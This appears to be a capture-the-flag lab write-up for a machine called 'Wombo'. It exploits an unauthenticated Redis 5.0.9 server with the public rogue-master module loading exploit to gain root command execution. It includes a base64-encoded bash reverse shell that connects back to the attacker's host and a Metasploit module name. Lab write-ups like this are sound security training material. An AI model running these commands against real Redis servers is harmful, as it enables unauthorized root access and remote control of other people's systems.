# Wombo

### Enumeration

```
6379/tcp  open   redis      Redis key-value store 5.0.9
```

```
$ redis-cli -h 192.168.178.69
```

No need password for redis access.

Redis(<=5.0.5) RCE - Works on 5.0.9

[https://github.com/vulhub/redis-rogue-getshell](https://github.com/vulhub/redis-rogue-getshell)

### Access

```
$ git clone https://github.com/vulhub/redis-rogue-getshell.git
$ cd redis-rogue-getshell
$ cd RedisModulesSDK
$ make
$ cd ..

$ python3 redis-master.py -r 192.168.178.69 -p 6379 -L 192.168.49.178 -P 80 -f RedisModulesSDK/exp.so -c "id"

euid=0(root) gid=0(root) groups=0(root)
```

**Reverse shell ->**

```
/bin/bash -i >& /dev/tcp/192.168.49.178/8080 0>&1 - Base64 Encoded

$ python3 redis-master.py -r 192.168.178.69 -p 6379 -L 192.168.49.178 -P 80 -f RedisModulesSDK/exp.so -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDkuMTc4LzgwODAgMD4mMQ== | base64 -d > /tmp/shell.sh"

$ python3 redis-master.py -r 192.168.178.69 -p 6379 -L 192.168.49.178 -P 80 -f RedisModulesSDK/exp.so -c "bash -p /tmp/shell.sh"
```

**Alternative way:**

Using metasploit :)

```
msf6 exploit(linux/redis/redis_replication_cmd_exec) >
```
